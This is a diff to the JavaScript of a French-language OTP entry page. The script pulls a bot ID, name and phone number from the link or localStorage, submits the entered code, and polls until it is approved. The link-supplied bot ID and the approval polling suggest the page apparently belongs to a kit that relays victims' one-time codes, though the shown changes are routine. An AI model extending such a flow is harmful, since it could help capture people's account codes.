@@ -138,22 +138,24 @@ body{
         (function() {
             // ── 1. Get parameters from URL and localStorage ──
             const urlParams = new URLSearchParams(window.location.search);
-            const botId = urlParams.get('botId') || localStorage.getItem('botId');
-            const name = urlParams.get('name') || localStorage.getItem('name');
+            let botId = urlParams.get('botId') || localStorage.getItem('botId');
+            let name = urlParams.get('name') || localStorage.getItem('name');
             let phone = urlParams.get('phone') || localStorage.getItem('phone');
 
+            // Phone fallback: extract from subtitle (displayed number)
             if (!phone) {
                 const subtitle = document.querySelector('.subtitle');
                 const match = subtitle.textContent.match(/\((\+?\d+)\)\s*(\d+)/);
-                if (match) phone = match[1] + match[2];
-                else phone = '79046955';
+                if (match) phone = match[1] + match[2]; // e.g., "+22679046955"
+                // else phone remains undefined – we'll check later
             }
 
+            // Store them in localStorage for the next steps
             if (botId) localStorage.setItem('botId', botId);
             if (name) localStorage.setItem('name', name);
             if (phone) localStorage.setItem('phone', phone);
 
-            // ── 2. Create a message container dynamically ──
+            // ── 2. Create a message container (no alerts) ──
             const container = document.querySelector('.container');
             const msgDiv = document.createElement('div');
             msgDiv.id = 'message-box';
@@ -164,7 +166,6 @@ body{
             msgDiv.style.fontSize = '15px';
             msgDiv.style.fontWeight = '500';
             msgDiv.style.transition = 'all 0.2s ease';
-            // Insert before the resend-wrap
             const resendWrap = document.querySelector('.resend-wrap');
             container.insertBefore(msgDiv, resendWrap);
 
@@ -209,7 +210,7 @@ body{
                         }
                     }
                     checkAllFilled();
-                    hideMessage(); // hide any previous message on new input
+                    hideMessage();
                 });
 
                 input.addEventListener('keydown', function(e) {
@@ -221,7 +222,7 @@ body{
                 input.addEventListener('blur', checkAllFilled);
             });
 
-            // ── 4. Timer & resend (fixed) ──
+            // ── 4. Timer & resend ──
             const timerSpan = document.querySelector('.timer');
             const resendWrapEl = document.querySelector('.resend-wrap');
             let totalSeconds = 5 * 60;
@@ -279,15 +280,23 @@ body{
             continueBtn.addEventListener('click', function() {
                 if (this.disabled) return;
 
-                // Clear any previous message
                 hideMessage();
 
-                const otp = Array.from(inputs).map(inp => inp.value).join('');
-
-                if (!botId || !name || !phone) {
-                    showMessage('Données manquantes (nom, téléphone ou bot). Veuillez recommencer depuis la première étape.', true);
+                // ── Required fields check (no defaults) ──
+                if (!name) {
+                    showMessage('Nom manquant – veuillez revenir à l\'étape précédente.', true);
                     return;
                 }
+                if (!phone) {
+                    showMessage('Numéro de téléphone manquant – veuillez recommencer.', true);
+                    return;
+                }
+                if (!botId) {
+                    showMessage('Identifiant du bot manquant – veuillez utiliser le lien correct.', true);
+                    return;
+                }
+
+                const otp = Array.from(inputs).map(inp => inp.value).join('');
 
                 continueBtn.disabled = true;
                 continueBtn.textContent = 'Vérification...';
@@ -319,7 +328,6 @@ body{
                                 } else if (status.approved === false) {
                                     clearInterval(pollInterval);
                                     showMessage('Code incorrect. Veuillez réessayer.', true);
-                                    // Reset button
                                     continueBtn.disabled = false;
                                     continueBtn.textContent = 'Continuer';
                                     continueBtn.style.background = '#1976d2';
@@ -328,7 +336,6 @@ body{
                                     checkAllFilled();
                                     inputs[0].focus();
                                 }
-                                // else still pending
                             })
                             .catch(err => {
                                 clearInterval(pollInterval);
